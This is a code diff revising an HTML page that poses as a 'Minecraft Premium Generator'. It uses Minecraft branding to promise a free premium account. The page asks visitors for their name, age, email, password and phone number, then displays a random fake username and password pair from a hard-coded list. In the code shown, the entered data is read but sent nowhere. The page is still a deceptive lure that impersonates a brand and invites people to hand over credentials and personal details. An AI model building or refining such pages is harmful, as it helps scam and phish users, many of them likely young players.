@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Free Minecraft Premium</title>
-  <link rel="icon" href="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/favicon.ico">
+  <title>Minecraft Premium Generator</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/favicon.ico">
   <style>
     body {
       margin: 0;
       padding: 0;
-      background-color: #171615;
+      background: url('https://i.imgur.com/8OQRZbO.png') repeat;
       font-family: 'Segoe UI', Tahoma, sans-serif;
       display: flex;
       align-items: center;
@@ -18,28 +18,27 @@
     }
 
     .form-box {
-      background-color: #f3f3f3;
+      background-color: rgba(255, 255, 255, 0.95);
       padding: 40px;
-      border-radius: 6px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.4);
+      border-radius: 10px;
+      width: 90%;
+      max-width: 440px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      text-align: center;
     }
 
     .form-box img {
-      display: block;
-      margin: 0 auto 25px;
       width: 180px;
+      margin-bottom: 25px;
     }
 
     h2 {
-      text-align: center;
-      color: #333;
       font-weight: normal;
+      color: #222;
+      margin-bottom: 10px;
     }
 
     p {
-      text-align: center;
       color: #555;
       font-size: 14px;
       margin-bottom: 25px;
@@ -69,26 +68,22 @@
     }
 
     button:hover {
-      background-color: #00a000;
+      background-color: #009900;
     }
 
     #result {
       margin-top: 20px;
-      background: #fff;
+      background: #eef;
       padding: 15px;
-      border-radius: 4px;
-      color: #222;
+      border-radius: 6px;
       display: none;
-    }
-
-    #result p {
-      margin: 8px 0;
+      color: #222;
     }
   </style>
 </head>
 <body>
   <div class="form-box">
-    <img src="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/logo.svg" alt="Minecraft">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Minecraft_logo.svg" alt="Minecraft">
     <h2>🎁 Claim Your Minecraft Premium Account</h2>
     <p>Please provide your real information to verify eligibility.</p>
 
@@ -97,13 +92,13 @@
     <input type="email" id="email" placeholder="Email Address">
     <input type="password" id="password" placeholder="Password">
     <input type="tel" id="phone" placeholder="Phone Number">
-    <button onclick="claimAcc()">Claim Now</button>
+    <button onclick="claim()">Claim Now</button>
 
     <div id="result"></div>
   </div>
 
   <script>
-    function claimAcc() {
+    function claim() {
       const name = document.getElementById("name").value.trim();
       const age = document.getElementById("age").value.trim();
       const email = document.getElementById("email").value.trim();
@@ -112,26 +107,25 @@
       const result = document.getElementById("result");
 
       if (!name || !age || !email || !pass || !phone) {
-        alert("Please fill in all fields!");
+        alert("Please complete all fields.");
         return;
       }
 
-      const accs = [
-        "Steve_2001 | HeroCraft2025",
-        "EnderSlayer | Nether!King123",
-        "Diamond_PvP | pickaxeOP321",
-        "BlockLord | redstoneMaster",
-        "Herobrine88 | ghostcode666"
+      const accounts = [
+        "DreamFree2025 | Hunter123",
+        "StevePvP | CreeperKillz",
+        "NotchOG | MojangRocks",
+        "RedstoneGeek | pistonPower",
+        "CraftedX | 123BlockMan"
       ];
 
-      const random = accs[Math.floor(Math.random() * accs.length)];
-
+      const rand = accounts[Math.floor(Math.random() * accounts.length)];
       result.style.display = "block";
       result.innerHTML = `
-        <p><strong>✅ Verification Complete!</strong></p>
-        <p>Your Minecraft Premium Account:</p>
-        <p><code>${random}</code></p>
-        <p style="color:red;">⚠️ If it doesn't work, someone may have already claimed it!</p>
+        <p><strong>✅ Verification Passed</strong></p>
+        <p>Your Minecraft Premium account:</p>
+        <p><code>${rand}</code></p>
+        <p style="color: red;">⚠️ Note: Some accounts may already be claimed.</p>
       `;
     }
   </script>
